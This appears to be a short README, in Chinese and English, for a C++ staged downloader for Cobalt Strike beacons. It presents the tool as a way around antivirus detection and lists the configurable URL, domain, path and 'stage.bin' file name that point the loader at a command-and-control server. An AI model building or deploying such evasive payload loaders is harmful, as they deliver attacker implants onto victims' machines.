# HttpStageDownloader
cobaltstrike的http分阶段下载器 cpp版本
cobaltstrike stage downloader writed by cpp

参考视频：https://www.bilibili.com/video/BV1MA4y1Z7Uz/

cobalt strike的http beacon很容易被查杀，这里用wininet和winhttp写了个分阶段下载器。
代码里的<br>
   const WCHAR* szUrl = L"http://127.0.0.1/async/Newtab_promos";<br>
    const WCHAR* szDomain = L"127.0.0.1";<br>
    const WCHAR* szUrlPath = L"/async/Newtab_promos";<br>
    const char* szFileName = "stage.bin";<br>
自己根据profile文件进行修改.<br>


